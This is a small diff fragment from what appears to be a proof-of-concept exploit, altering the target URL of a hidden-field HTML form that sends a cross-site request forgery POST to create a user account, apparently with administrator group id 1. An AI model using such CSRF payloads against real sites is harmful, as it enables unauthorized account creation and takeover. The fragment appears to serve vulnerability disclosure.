@@ -32,7 +32,7 @@ NOTE: Leave the `gid` parameter is set to 1 to ensure that the account will have
     <title>Send CSRF-POST Request</title>
 </head>
 <body>
-    <form action="https://vulnerablesite/index.php?page=ger_user" method="POST">
+    <form action="https://vulnerablesite.com/index.php?page=ger_user" method="POST">
         <!-- Campos do formulário -->
         <input type="hidden" name="task" value="save">
         <input type="hidden" name="boxchecked" value="0">
